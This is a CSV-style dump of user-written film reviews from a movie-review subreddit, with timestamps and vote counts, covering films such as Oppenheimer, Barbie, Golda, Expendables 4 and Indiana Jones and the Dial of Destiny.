TL;DR: 6.1/10 film with a nice twist. Slow burn and intense film that had me guessing throughout. Benicio is the star but his story arc feels lacking. ",moviereviews,2396,436,37,0
1696532131.0,The Creator: Sci-Fi's Game Changer or Just Hype? Review!,"Let’s dive deep into *The Creator* – a gorgeous ride through a world where cutting-edge technology blurs the line between memories and reality. This movie is easily my favorite John David Washington film to date. The Creator, at its core, has some serious strengths that make it a successful movie. Gareth Edwards directs a film starring John David Washington, Gemma Chan, and his go-to guy Ken Watanabe. The music in the film is by the uncanny Hans Zimmer. Let’s break down The Creator into “The Good” and “The Bad”, shall we? 

## The Good:

**Mind-Blowing CGI:** First and foremost, let’s talk about the CGI in *The Creator*. It’s not just good; it’s mind-bendingly good. The visuals are so stunning that you’ll question whether you’re watching a movie or peering into the future. Every frame is a work of art, and it’s evident that the creators spared no expense to bring this world to life. There are moments in which *The Creator* feels like we’re watching a movie so much like our own that it doesn’t always feel like a movie. This alternate-history film in which humanity adopts AI is so similar to our own that it feels prophetic. That’s a testament to how beautiful *The Creator* is and how well the movie is put together. There are moments when you will absolutely forget that you are watching something that doesn’t actually exist and you’ll feel like you’re seeing something from our very own future, which is amazing.

**Perfect Pacing:** Pacing can make or break a movie, and *The Creator* gets it just right. It tricks you with an opening montage that might make you think you can relax for a bit. But don’t be fooled! This movie lures you into its world with a false sense of security and then smacks you with current events. There’s a gradual immersion into the world and aesthetics of *The Creator* that I love. The movie borrows from a few different genres but is able to blend them all into a beautiful package. There’s a moment when you feel like you may be watching a buddy cop movie. There are other moments when you feel like you are watching a revenge tale. But ultimately you are watching a provocative movie about a man and his views on what defines a family.

## The Bad:

**A Familiar Echo:** While *The Creator* has a lot going for it, it does have a familiar echo of previous sci-fi works, particularly Neil Blomkamp’s “[Elysium]( and “[District 9]( While this might not necessarily be a bad thing, some viewers may find themselves wishing for a bit more originality in the storytelling. The movie is unapologetic with its inspiration with hints of [Star Wars]( [Blade Runner]( [Foundation]( and others all throughout. This may be a disappointment to some looking for something that feels truly unique. In fact, it would require a lot of convincing that this story doesn’t take place in one of those other stories. That’s just a testament to how indistinguishable *The Creator* is from the stories that inspire it.

1696437504.0,Aftersun,"With *Aftersun*, writer-director Charlotte Wells has crafted a brilliant debut film.  Against the languid backdrop of an extended vacation, she creates an intimate portrait of a father and daughter that gradually builds to an emotionally devastating climax.  Until that point arrives, the movie proceeds in an unassuming way, with each scene imperceptibly building upon what came before.  While Sophie’s coming-of-age narrative unfolds, Calum’s depression reveals itself in ways that are unmistakable to the audience but that she is unable to process.  The movie’s themes finally come into view when their vacation ends, revealing a story of lingering sadness, regret and the unreliable nature of memory.  Throughout the movie, Wells trusts the audience to put the pieces together like her heroine.  Wells’ direction evokes an artist constructing a story through a series of rich tableaux, a style reminiscent of Julian Schnabel and Wim Wenders.  *Aftersun* is a beautiful and haunting film, one that unapologetically forces you to confront its themes head-on.  **Highly Recommended**.

1696147284.0,Golda,"Golda
starring Helen Mirren, Camille Cottin, Live Schrieber, Lior Ashkenazi and Dvir Benedek
written by Nicholas Martin
directed by Guy Nattiv
Rating:  ♦♦♦◊◊

I remember when Golda Meir (1898 - 1978) was still alive, and I knew who she was.

Golda is a biographical drama about the only female Israeli Prime Minister.  And, it’s about the 1973 Yom Kippur War when Golda Meir, who was already an old lady, proved she was a woman of steel, facing down and defeating surrounding Arab armies that came dangerously close to overrunning Israel.  By comparison to Israel’s fantastic success in the 1967 Six Day War, the Yom Kippur war was a near-disaster.  Israel prevailed, but only barely.  Subsequently, the Prime Minister was subject to an official inquiry by the Agranat Commission.  She was cleared of wrongdoing in the prosecution of the war, but she resigned the premiership in June 1974.  Meir’s testimony before that Commission is the premise of this story.

You will certainly learn a lot about the Yom Kippur War, but Golda is not exciting.  It’s interesting, but not exciting.  Helen Mirren is so heavily made up that it’s difficult to appreciate her acting.  I can’t even recognize her.  Maybe that’s a good thing.

The biggest thing about Golda is the tobacco smoke.  Meir was a heavy chain-smoker.  Throughout the film, Mirren is either smoking or lighting a cigarette.  The relentlessness of it made the film awful to watch.  You could practically smell the reek of tobacco.  I was bothered throughout the film by the awful grayness of it:  Meir’s gray hair and gray complexion; her grandmotherly clothes; the gray cloud of tobacco smoke that floated in every room and almost followed her around, engulfing her like her own atmosphere.  The story of the war gets lost in this oppressive cloud of grayness.  The Prime Minister seems less like a living human being than a shuffling pile of gray ash.

Was she a great leader?  Charismatic and clever?  Did she have a will of iron?  Was she a tough old bird who could dominate any of the men in her government circle?  Was she feared?  I didn't get a sense of any of that.  From the film it only felt like she was a kind of accidental Prime Minister.

The movie was a great performance by Mirren, yes.  But it’s also just a gray and ugly piece of nothingness.  It’s not the sort of film I would ever enjoy re-watching.",moviereviews,2374,409,53,0

1695926842.0,Expendables 4 Review,"This  action adventure film is the 4th installment of a once surprisingly  successful film series. As someone who has seen the other three already,  I knew exactly what this film’s recipe was going to be. Lots of  explosions, great action sequences, quick dude jabs, and watching old  action stars have fun making a film together. If you go into this movie  with high expectations then you will surely be disappointed with the  outcome. This film stays in its lane and does not try to deviate as once  again, America is in danger from a WW3 threat and who comes to save the  day, The Expendables. Some new cast members including 50 Cent and Megan  Fox help bring some new star power to the series and while neither are  great actors, each of them brought something unique to the film. Megan  being the HOT eye candy and 50 being the hard and jacked ex-military man  who gave the producers the IP to one of his most hit songs that was  used creatively. Returning staples Jason Statham, Slyvester Stallone, and Dolph Lundgren continue to take the spotlight with their chemistry  while the other actors provide good support.

Throughout  the film there were locker room jabs that at some points were pretty  comical. The fight scenes were overall done decently with a little over  the top CGI sprinkled in. The overarching plot and dialogue were just  okay and I found myself questioning how this movie was over two hours  long considering there wasn’t many different locations and scenes that  were shot. There were a couple scenes that could have been cut as they  literally brought nothing to the film, looking at you Megan and Jason  fighting part. Without spoiling the ending, there is also a surprise  that made me roll my eyes but it didn’t really add or take anything away  from the film.

Overall, I would  rate this film at a 5/10. The action scenes and small comic jabs helped  raise this score, but the plot and meh dialogue forced me to lower it  down a few notches. This film is literally a copy and paste formula from  the others and if you know this going in, it will be a more enjoyable  film. This film is the definition of a popcorn flick and the producers  and actors know this and didn’t try to do anything else major with it.  This is also the definition of a dude flick target audience film, hence  the Megan Fox hire and all her basically see through lingerie and white  clothes… but you won’t catch me complaining about that 😉. I wouldn’t be  shocked to see an Expendables 5 coming out in a couple years but after  the 3rd flopping and this one being very meh, I could see it being the  final in the series. I would recommend this movie to anyone who wants to  see a decent action flick and all their old favorite action stars  having fun making a film together. This will be nowhere near any awards  but I did enjoy myself during the film.

TL;DR:  5/10 movie with decent action. Total guy flick with explosions and good  action. Very meh plot with just as meh dialogue throughout. Megan Fox  is still hot.",moviereviews,3029,541,43,0

Don't get me wrong, it was written and acted perfectly, the set, the tension, the everything. Cillian Murphy was spectacular as always.

However, one thing that it was a huge let down was the it was written like if the only intended audience was actual historians. I was lost the entire time. All I knew is that Oppenheimer was the director of the Manhattan project and that was it. Of course there are a lot of other things sorrounding it; instead of explaining this, the film assumed I knew the entire history of it to the smallest details. I had absolutely no idea who or what anyone else was. No idea who RDJ's characters's organization was, Senate hearing, I was absolutely lost. The only way I would've known any of this would be if I was a history major or something. I tried paying attention, but to no avail.

1695819276.0,The Nun II,"The issues I had with *The Nun II* (pacing, visual murkiness, overly busy plot) are the same as those that afflicted director Michael Chaves’ previous outing, *The Conjuring: The Devil Made Me Do It*.  Instead of building on the operatic style of *The Nun*, Chavez instead delivered a movie that looks and feels exactly like his last one.  For most of its run time, *The Nun II* is a little more than a haunted house movie with creaky floors, creaky doors and things lurking in the shadows.  *The Nun* succeeded because it was distinct from its sibling franchises (The Conjuring and Annabelle).  Now that this franchise is stylistically the same as the others, its reasons for existing are almost nil.  Farmiga and Bloquet are solid, but the movie that surrounds them is a tired slog.  I’m guessing (hoping?) that Valak will finally meet the Warrens in *The Nun III* and bring this element of the Conjuring lore to a close.  With that in mind, there is no compelling reason to see this movie.  **Not Recommended**.

The cinematography was absolutely gorgeous and the score was fantastic. I love how it was faithful to the source material of the book and I just really appreciate that, cuz I feel like book to movie adaptations never represent the original story like it should. And I strongly disagree with the people saying that it “could have been cut down” I feel like people only say that because they have an attention span of a fucking goldfish. and how “the deaths were to far apart” and “André

A movie with no context or character development, it seems like there preferred movie is spooky vampire man kill people oh spooky. Sorry, It just annoys me when people don’t appreciate a good film just because it’s not constant action. And it also worries me because I would love to see a second film but if it gets to many bad reviews then the chances of that happening get lower, and we will just continue to get ghost horror movies with no soul.

Doesn’t seem to be a ton of interest around it, but I found the whole Gamestop stock debacle a couple years ago really interesting so I wanted to see how they portrayed it.  The movie was competently written and shot and has some good performances and funny moments, but overall I was pretty disappointed.  Mainly because it just felt like a movie with nothing to say.  I was kind of hoping for something like The Big Short, a real indictment of the system.  Dumb Money is really shallow by comparison.  There’s a lot of vague talk about how the system is rigged and the little guy can’t get ahead, but it’s all very esoteric.  It feels like a movie that wants to have the aesthetics of rebellion, but can’t bring itself to actually say anything that might be controversial.  So yeah, miss this one.

1695612474.0,Unseen,"     Ahhhh Blumhouse Productions. The cornerstone of true cinematic brilliance, offering such arthouse classics as “Jem & The Holograms”, Rock “The Dwayne” Johnson's “Tooth Fairy”, the “Fantasy Island” remake no one asked for, & all of those new non-Rob Zombie Halloween movies. Don't ever change, Jason Blum. I love you.

     So this masterpiece focuses on a young woman (who has eyesight so bad, she is legally blind) named Emily who has been drugged & kidnapped by her ex-bf. We find out later that this guy is a know-it-all, TED talk guru named ehhhhh.. “Who-the-fuck-cares”, who is apparently psychotic and wants to kill his ex-gf. To be perfectly honest, after the first 15 minutes, I don't really blame him. Oh, & there is a chubby, suicidal gas station attendant who she accidentally calls because she cannot see what number she is calling. It's even harder to call the gas station attendant a likeable character because the dialogue gives nothing except that as her character. I honestly had to look up who that actress was because I swear, I thought it was the same one that played Rose in those awful Star Wars sequels. *Spoiler alert – it was not.

     Q: How many movies can I unsee?

     A: Not this one, apparently.

     The dialogue is droll, the acting is subpar, and I really hope they didn't think filming in a lot behind someone's house was the greatest idea. There is no character depth, besides semi-blind Emily (I only say this because it's the only line on the other end frantically saying her name in the entire scope of acting the other girl has) stumbling around in the forest talking to Non-Rose about what she would rather be doing with her time. That may be the most honest acting you will get in this movie aside from Missi Pyle, who has an inherent ability to steal every scene she is in, as a stuck up, entitled gold digger that talks a lot of shit to the gas station attendant that Emily just happens to cold call and proceeds to do everything except add something to the plot.

     This is film debut for director Yoko Okumura who after seeing her picture and things she leaves on social media is probably why she cast “Not-Rose” in the part. You can't really get mad at a newcomer's first outting, but my brain is struggling to figure out what she saw in this script to take on.

    Unseen was released digitally over MGM and Paramount streaming platforms, so it is difficult to get the numbers on production or how it performed. It did get relatively positive reviews, but I rarely pay attention to that. Most of the time I don't agree with what any “film critic” thinks because I like to form my own opinions; every once in a while, we agree. Unfortunately, this is not one of those times.

1695149199.0,"Equalizer 3 [no spoilers, but a bit of a reference to what happens to a specific character]","The final movie in the series, it follows Robert McCall on his final quest against evil forces. In this film, he finds a small town in Italy and takes a liking to the peacefulness. However, a group secretly runs the town by use of violence. As per the previous films, Robert takes the bad people on.

The opening of the movie got to me. It is a long shot of a car riding on a road next to a farm, with mountains in the background. It looks like a photograph, which is something that I easily take a liking to.

Generally, the film seems slow, in the sense that it does not have a ton of fast cuts. This is something that I like - it gave me a sense of being able to enjoy the movie. Granted, there are fast cuts during the action scenes, which of course makes sense. I find that the general pace of the movie is rather calming.

The only time I have seen the first two films was back when they were in the cinema, and because of that I don't remember the finer details of them, so I can't compare the third one to them. One thing I noticed about the third one is that Robert seems quite brutal at times. He kind of plays with people right before killing them off. An example is like using a gun to make a sound as he is walking to them as they are wounded, to let them know he is on his way. This adds a sense of scariness to his character.

On the note of being unable to compare to the first two since it's been a while since I saw them, another point that I would like to bring up is the fact that there seems to be not much action involving Robert. He does fight, but it seems like there is a good portion where what he did was done off camera. This isn't a bad thing - it's just something I noticed.

Throughout the film, the music adds to the intensity to the film. During the action scenes, there is this screeching kind of sound used that can easily make you feel anxious.

Not to give anything away, there have been at least one moment in the film where something happens to a character that may be shocking, and can be hard to watch - especially since it suddenly happens. It has to do with a character in a wheelchair. I won't give it away, but I thought it may be worth mentioning.

The length of the movie feels perfect. It doesn't feel short, and doesn't feel long.

Equalizer 3 is a very good movie, and worth checking out in the cinema. I may be biased with watching it in the cinema because that's where I enjoy watching movies the most, but it's something worth watching. I give it a 9/10.",moviereviews,2507,491,62,0

Criticism I’ve seen multiple theory’s of the films meaning and plot, the only one that somewhat makes sense to me is the dream theory. I’ve also seen a lot of people say that the film has no real meaning and it’s to do with how you interpret it and the feelings it makes you feel. Towards the end the meaning didn’t matter to me as i was so disinterested. To me the whole “open to interpretation” thing seems lazy. I feel like the majority of decent directors in cinema can create a film full of randoms scenes that hardly correlate to each other with no real meaning and say “it’s whatever you make of it”. Subplots had hardly any relation to what seemed to be the “main” story either. If the dream theory is the intended plot of the film that redeems it somewhat. Tho if that’s the case the dream dragged on and i was disinterested by the end of it. Overall did not enjoy this film but open to changing my mind if i ever rewatch.

1695044067.0,Teenage Mutant Ninja Turtles: Mutant Mayhem," 

Hey so I really dug the new Ninja Turtles movie.  Felt like a really great, fresh take on an IP that hasn’t seen a lot of success in the past couple decades.  The animation and the Trent Reznor soundtrack really make it stand out stylistically.  Felt like a late 90s comic book come to life.  Loved the main four actors playing the turtles and Ice Cube actually kind of stole the show as Superfly.  Jackie Chan’s performance is a little flat, but it was still pretty charming for him to be in this.  The story is fairly basic, but works well for a kid-friendly film and has a lot of good jokes along the way.  It’s kind of a coming of age story which has the turtles acting more like kids than usual, which is nice.  The teenage aspect of the brand has always been underused.  Anyway, I’d definitely recommend it for anyone looking for a good movie to see with their kids.  Or that matter, fellow 90s kids like myself just looking for a nostalgia trip with some heart.

Her talking about how she doesn't get to do anything fun anymore and winging. Talking about how her husband is allergic to the sun so she couldn't go on some trip. HE'S ALLERGIC STOP COMPLANING. She also just straight insults him and says he's boring. He's just trying to learn.

1694411387.0,Indy 5,"Needing a bit of time for myself, I set up schedule to watch Indiana Jones: Dial of Destiny (DOD) this afternoon. I've seen the prievous movies a few times and read many of the comics. Ended up seeing a different movie while it was in cinemas, so this was sort of a make up session.

Indiana Jones: Dial of Destiny

7.5/10.
Lukewarm, slightly cumbersome Indy/Time Travel movie.

Going in I actually didn't know what to expect. I had seen the trailer and followed the related subreddit, picking up on ideas here and there. What we get when we started was a straightforward 20 minute WW2 action sequence intro, which was mostly enjoyable. Here, the Dial of Archimedes gets introduced which was gradually explained through the movie as a sort of time travel portal opening device. Don't expect an in-depth explanantion, it does what it does.

Indy was not his usual self and I liked Ford's altered characterization in this movie. He was elderly, sad and lonely, recovering from the death of Mutt. I hated to see him like that, but it makes sense. The absence of Mutt/ Marion in this movie was truly a real loss for the plot. There was some vague exposition given about how Mutt was killed several months or years earlier leading to a marital breakdown between Marion and Indy. It's handled ok. Death in Vietnam war was a good enough excuse for Shia's Mutt not coming back.

Marion (Karen Allen) does show up for a mere 2 minutes at the end, as Indy's reason to go on living. I would have done the movie with more 
Marion. It's much more interesting to me to see a couple go through the grief -healing process together, maybe to teach the audience something positive. IDK. Indy 3 showed us these movies can have a strong personal emotional message. But it hasn't been replicated since. At least not as well :(

Helena (Phoebe Waller Bridge) was quickly introduced as Indy's new companion. Mixed feelings. She was ok. Ford's Indy was getting older and she was put there to do his action scenes for him. A Short-round like character, Teddy (Ethann Isidore) comes along for the ride too. Neither are really likable, but that seems to have been the point. They represented the neglected survivor archetype.

I generally feel movies are only as good as their villans. Dr. Voller (Mads Mikkelsen) was an ideal choice as a mad nazi scientist in the movie. Sadly, Voller doesn't really shine like he should have. Was it dialogue or delivery or lack of chemistry? Can't tell. But something was missing. He doesn't really stand out like Belloq, Molla Ram or even Spalko. Voller's henchmen are the usual gang of incompetent cringe ""disney+"" henchmen, with less said the better.

Realism has never been a strong element in Indiana Jones franchise, so I let plenty of nonsense slide over the course of these movies. Looking at you, kid flying plane when it was just mentioned you can't fly a plane. Another painful scene was how Voller returned, having survived his initial ""false death"". That is being hit by a large metal pipe fixture on the side of the tracks while going easily 60+ kmph on speedng train. That should have knocked his head clean off or at minimum broken his neck. Do I care? No. Was it silly? yes.

The plot progresses. Cue prolonged monotonous action scenes. The Dial gets passed around a few times and finds itself in New York, Tangier and then Sicily. I noted DOD borrows many elements from more original movies including KOTCS. Eg, the fist fight with the baddie on board a train was almost identical to the fight scenes in other movies. The chase scene through the protests/parade was repeated again in this movie except in New York.

The whole mid section of the movie felt extremely unedited and uninspired. The pacing was so off, it drags on for much longer than bearable. However the freshness of the visuals, shot clarity and 60s setting kept my mind off things. Mangold and his team at least made it look stunning. Still I did find myself checking my watch a few times wondering how long was left. Never a good sign. Sallah ( John Rhys Davies) makes a brief, but welcome appearance. Antonio Banderas has a short role as ""Renaldo"", before being killed off.

Finale wise, the payoff to the past 2 hours was Indy's plane goes back in time for a total of 15 min. Most of that looking outside a plane at CGI battles below. In fact, the plane only lands for maybe 5 of those 15 minutes for a quick chat with a very confused looking Archimedes. The whole event was so rushed, Indy quickly found himself waking up back home in 1969 for a 2min marital Reunion.

Thus, an ending was provided that closes the book for Ford's Indy, but left it open for Helena. If that doesn't happen, I think most people will be ok with that.
This passable semi blockbuster can end it all right here.
It's just a shame aside from introducing new characters like Helena/Teddy, the movies primary outcome was to show people Indy can/has gone back in time and ultimately, at least this version of Indy never got to experience real (happy) family life.",moviereviews,5034,892,134,0

1694157349.0,How 'Past Lives' Tenderly Redefines the Romantic Drama,"I wrote about Celine Song's debut *Past Lives*, which is beautiful and has a texture to it that is really difficult to describe. You can tell she's a filmmaker that's interested - fascinated maybe - in the subtlety that makes up the human experience.

It’s been nearly unanimously praised, so what makes the film a must-see? Explaining the plot just doesn’t cut it. Girl leaves Korea… 25 years pass… boy flies to Manhattan to see her… *is that it?*

Well, no. That’s not it. Because there’s a poetic, human texture woven through *Past Lives* that’s nearly impossible to explain. Parse the critic’s reactions, and you’ll see shoots from the same descriptive tree: “bittersweet”, “wrenching” and “tender” all get a healthy run. So why does the film *feel* this way?

I think it’s because the film manages to capture those indescribable emotions that we all recognise, but struggle to put into words. The slight vertigo of tasting a life you thought had long disappeared. The bowling ball that punches your gut when you see an old photo of an ex. The butterflies that dance inside you when that photo, instead, shows an unrequited crush.

Loaded with subtext - and never quite unfolding the way you expect - it’s a film that makes you feel as if golden lights are twinkling on your soul. If there were an Oscar for Longing Stares, *Past Lives* would claim more gold at the next Academy Awards than Michael Phelps ever did in the pool.

1694051026.0,Indiana Jones and the Dial of Deathiny,"*This Dial Goes to 11.*

Since they couldn't let it end with ""Last Crusade"" and ""Crystal Skull was the worst way to end the franchise, they made a less bad ending. Should I be thankful for the help my childhood hero needed? Indiana is supposed to be the guy on the motorcycle coming to save the day. And why was the plane flying so low in the last act? And why were the bad guys shooting at people who had nothing to do with them? So many more questions. Where was ""Short Round?"" If you're gonna say goodbye, do it like it's the last one... and they didn't. 

Magic is in the details, and they handed the details over to fans even though the original artists should have kept the legacy and fought for it with as much love and passion as they could. Only the last two movies end with Indiana in the hands of Nazis. Easy. lazy, if exciting opening, but not the heart of the adventure or adventurer that made me want to be an archeologist. Seeing the world and things just got in the way. Let's just throw action in to get the thing going. Cause.. attention spans I guess. But, surviving that just makes it what Marvel became, and Fast and Furious is, all icing and no cake. 

But, there are some flavors there, and the sprinkles are nice. But, the average is sometimes less forgivable than a bad movie. It's something like a pyrrhic victory. This comes from someone who knows how hard making a movie is. Here are the basic criteria: There is bad, there is bad-average, there is average-average, there is good-average, and there is great! This was good-average. And like Michael Jackson said at the end of his final documentary (to some of the greatest musicians in the world), don't be okay ""no, that's not it. The difference is love.""

1694005926.0,Birth/Rebirth,"With Birth/Rebirth, first-time director Laura Moss has given new life to the legend of Dr Frankenstein and his monster.  Not content with simply rehashing the familiar themes of a scientist with a God complex and a misunderstood monster, Moss shifts our focus to how they apply to both modern science and motherhood.  First there is the ethical boundary of how far science can go to either save life or alleviate human suffering.  Second is the notion of how a woman’s material instinct can be corrupted when given a second chance (and even a third).  The movie deviously has the audience weigh what course of action is more horrific:  how Casper abuses her own body in the name of science, that she’s brought a child back to life or the extreme lengths Celie and Casper will go to keep Lila alive.  To her credit, Moss treats the subject matter seriously throughout, to the point where several scenes may be triggering for some.  (The movie’s gore is limited but convincing and may force you to avert your eyes.)  Like 2020’s excellent The Invisible Man, Birth/Rebirth makes an old monster relevant by viewing it from a woman's perspective.  Recommended.

1693738105.0,Barbie,"Barbie. Barbie and Barbie again - a glamorous pink avalanche that has been going on since the very announcement of the film. Masterful marketing and a masterpiece cast, but what is hidden under all this glamour? Is there any value in the film without marketing and general hype?   
 

SELF-SUFFICIENCY  

Deconstruction of the idea that 'full' people should be in relationships, which is invested in us from childhood, just like in Barbieland, where ""There is Ken and Barbie"", but there is no ""There is Ken and There is Barbie"", that is, you need some that addition, what can you do yourself? A similar idea can be observed in our world, where ""we are"", but there is no ""you and me"", that is, to be together with someone = completeness, to be alone - inferiority.  People in relationships are perceived as complementary to each other, just like Ken to Barbie. I can confirm this from personal experience, and in principle, I think many people get hung up on the obligation to be in a relationship - in fact, this is someone's stupid invention that makes a person feel inferior and not self-sufficient.   
 

IMAGINED VIRTUAL WORLD

Barbieland is a fictional ideal, stereotypical world, a kind of stronghold of prejudices with all the ""shoulds"" and ""shoulds"" that we unconsciously drag into the real world. We live by them. According to the rules that make a person correspond not only to gender, but also to status, place in society, work, family, appearance, etc. The film deconstructs this model of perception of reality through prejudices and all sorts of social obligations that society imposes on a person from childhood. It's time to pay attention to reality and start thinking (although why? 0\_0) 

&#x200B;

EVOLUTION FROM GIRL TO SELF-SUFFICIENT WOMEN

The popular moment of the film, which was also shown in the trailer (it personally hooked me the most and aroused such interest in ""Barbie"") with a reference to Kubrick's cult film ""A Space Odyssey 2001"" seems to hint to us that someone will overcome a certain evolutionary trait and change, in our case, this is the character of Margot Robbie - Stereotypical Barbie.  Her character goes through a transformation from such a simple form as a ""stereotypical person"" to a ""self-sufficient person"", which turns out to be a very complex form of life for the heroine herself, at first she does not want to put up with such changes at all, but there is a person who explains to her, that such changes are inevitable and then the Stereotypical Barbie evolves into a WOMAN or a self-sufficient person. 

&#x200B;

PERMISSION FOR THE RIGHT TO BE A HUMAN 

At the end of the picture, the heroine Margosha asks permission from Ruth Handler (the creator of the cult Barbie toy) to be a person, to which she receives a simple, but probably the only answer that no permission is required, enter freely.  Probably by this the author wanted to reflect the actual problem of people who are looking for themselves, who are waiting or demanding permission (often from their notorious ""I"") to be whoever you want, live as you want, etc., although no permission is required, it is enough to deal with yourself and start acting on your own. 

&#x200B;

This is the main thing that I wanted to analyze, in addition to this, I can highlight a few more topics: who is on horseback matriarchy or patriarchy? / capitalists are trending ""vertically"" / the relationship between a man and a woman.

1693570096.0,A Man Called Otto,"A Man Called Otto
starring Tom Hanks, Mariana Trevino, Rachel Keller, Manuel Garcia-Rulfo, Truman Hanks and Mike Birbiglia
screenplay by David Magee
directed by Marc Forster
Rating:  ♦♦♦♦♦
	Based on the Swedish novel En man som heter Ove by Fredrik Bachman (2012), and the movie “En man son heter Ove” (2015, directed by Hannes Holm).  The movie reminded me of the 2008 Clint Eastwood movie Gran Torino in that the story features a grossly unpleasant old widower who is slowly softened by his tolerant neighbors.

A Man Called Otto is billed as a comedy-drama, but the main character, Otto Anderson, is so disagreeable that calling any of it “comedy” seems to strain the language a bit.  Otto Anderson is a 63-year-old widower, living in a rowhouse in suburban Pittsburgh, Pennsylvania.  Six months after losing his wife Sonya, a schoolteacher, Otto has become a cynical, fastidious curmudgeon.  He’s the kind of old man who yells at children to get off his lawn.  Not metaphorically, but literally.  From periodic flashbacks to his life with Sonya, it seems he was always fastidious.  He’s a man who follows rules, and expects the same from others.  Now, pushed into retirement from his job at a steel plant, he cancels his utilities and plans to kill himself, to join his late wife.  He very graphically tries three expiration methods in the course of the film, but he can’t seem to get it done.  That’s quite odd for him, because Otto is a practical and thorough man who knows how to do things.  His repeated failures are not due to lack of resolve so much as the constant interruptions from his neighbors, especially the new couple with two young children directly across the street, Tommy and Marisol.

Otto’s devotion to his neighborhood against encroachment by a big condo developer helps keep him connected to his neighbors’ lives  -  or at least to the neighborhood and all its goings on.  Even though he’s disgusted and angry at everyone, he nevertheless starts developing an awkward relationship with Tommy and Marisol, and their two young daughters.  As a practical and methodical man who knows how to get things done, he grudgingly teaches Marisol to drive (a standard transmission), helps another neighbor, Anita, with her radiators, and is friendly with a transgender delivery boy who is a former student of his late wife.

In the end, commitment to his neighborhood dissuades him from suicide.  He survives to die naturally of heart disease.  Tommy and Marisol, who show near superhuman patience dealing with him, discover that he has left them his house, his car, and all of his savings, somewhat similar to how Walt Kowalski leaves his beloved and coveted Gran Torino car to his Hmong neighbor, Thao Vang Lor.

Tom Hanks’ son, Truman, plays young Otto.  Interesting.",moviereviews,2784,466,62,0

**Description**

· This movie is another example of a sad story and a good movie. 

· From a cinematic and storytelling standpoint view this film delivers and appears to have a good production value 

o given that it was produced with a below average theatrical budget. 

§ It seems like it was made professionally.

· Watching this independent film almost felt like my soul was ripped out and then 

 replaced once the movie ended. 

· The film does a have a little of the good cop bad cop routine.

· Film is about the rescuing of kids from something

· Heavy on the suspense and drama. 

**Cast**

Jim Caviezel: Time Balltard

Yessica Borroto Perryman: Katy / Gisselle

Director: Alejandro Monteverde

**EXTRA**

Native Speakers of Cinema. Spielberg, Hitchcock. Many layers of translation. Establishes space. Understand the relationship seen on screen. Knowing the geography of what is on and off the screen. Its like feeling like you are actually in the room when they are filming because you know where everything is. Like you know the GPS quardinates of all the items in the scene. This movie does that.

1692752969.0,Oppenheimer/Barbie review!,"
both are on my letterboxd, they are quite long so bear with me.

Oppenheimer: (5/5)

*the anti-Nolan film. it doesn’t hit with your usual overcomplicated storyline and confusing timeline (like his last film before this), yet it highlights Nolan’s best quirks and it reminds everyone why he is one of our greatest directors in these times. Fantastic cinematography, absolutely mesmerizing, i will never be able to express my enjoyment when i witness him and Hoytema work together. Some shots were captivating, and of course, in Nolan signature, no cgi on the screen; watching the bombs explode felt like i was there with those people, it brought me with the characters. Also, the score and sound design of this film are immaculate. i don’t usually pay much attention to the score, but when it comes to Cristopher, it’s hard to NOT hear spectacular music. The production of this film is insane, and i’ll never stop praising it (*bummer that i couldn’t watch it in IMAX, i would’ve loved to see the 1.43 : 1 ratio 70mm black&white film that everybody talks about)

into the actual plot of the film, seeing the demise of a “hero” and ascend to regret and PTSD while the “villian” (RDJ nailed the role) toys with the protagonist simply because of a joke. Being the creator of something so ruthless and dealing with the repercussions of what you created and what it did to the world is already an interesting enough plot, but Strauss’s storyline really adds to it. the self importance of himself is funny to watch on screen, and his hypothesis of what the scientists think of him was a fun outlined piece of dialogue that after finishing the movie, becomes a funny gig imo. Cillian’s extraordinarily acting skills were shown in the best way possible. Nolan really knows how to put him, his skills and his looks into a pleasing piece of art. The whole “does the end justify the means?” pipeline works really well, Oppenheimer’s alienating “its for my country/we live in war/we should end the war/germany is off the rails” which in a way or another is valid. Being a jew in that time i imagine his hatred and despise for Germany ans wanting to use it on them, but when Hitler died, it really put him into thinking, is it ok what we are all doing? dedicating 3 years of your life for the purpose of becoming a genocide mass murderer takes a toll on you, and one of the best scenes in the movie (and in all Nolan’s cinematography might i add) after the bomb is released and everybody is applauding Robert, while he sees the bomb going off, and people having radiation exposure effects. speaking of perfect scenes, THE scene was fenomenal. i thought Cristopher kinda forgot how to do tension (hence Tenet’s way of tension is loud music and gibberish about timelines and stuff) because the last time i saw a tense scene was in Interstellar. But no, he proved to everybody how to do tension in film, i cannot gush enough about it. i would like to talk more about those two scenes but i already blabbered enough about this movie. definitely Nolan’s best, definitely ‘24 Best Picture and now i call myself a Cristopher Nolan enjoyer.*

Barbie: (2.5/5)

*have you seen those radical feminists (that are misandrists in disguise)? if they were a movie, this would be it. i like gerwing’s work and my expectations for this movie were through the roof. i am of opinion that Barbie should’ve been a silly unserious comedy family film. what did we get? a commentary of consumerism of our new world, the capitalist society that we created for ourselves (funny coming from a capitalist corporation),the patriarchy and a feminist message that is supposed to praise women, equality, equity between genders, human beings and life as a whole. the idea on paper sounds astonishing, yet the execution is horrible. i just don’t get why a fucking Barbie movie has to be so serious. but ok, i’ll take it. a serious Barbie movie. has no one heard of subtlety? this film is shoving down your face “women good, men bad” and don’t get me wrong, i love Ken being the “villian” (if we can call him that) and the almost ending where he has to find himself and become his own person, that is a good message in the film, but he turned midway through in a comicbook villian? the ending is also weird and i know this is nitpicking but where were they? in a spaceotemporal bubble of omnipresence and omnipresence that is devoided of all logic laws of physics? and also Barbie is a doll right? how can she just casually go to the real world? you know what, i’ll get a headache if i ask more logical questions.

thai film is so obnoxious, and thinks it’s so witty, different, meta, that it’s challenging the status quo when in reality, them mocking capitalism and moneydriven CEOs while being exactly that? kinda hypocritical of them in my humble opinion, and they inspire propaganda, something that has nothing to do with a goddamn Barbie film. the production design is immaculate, gerwing really outdid herself with this one, and the costume design& makeup definitely deserve some recognition. also, Margot Robbie and Ryan Gosling outshine absolutely everybody. their performances are out of this world and Gosling portrays Ken better than we all could’ve imagined. overall, a disappointing film that takes itself too seriously for its own good, with some interesting ideas that could’ve worked if made correctly. this reminds me of Don’t Worry Darling, but we’ll never get that low (i hope).*",moviereviews,5449,949,106,0

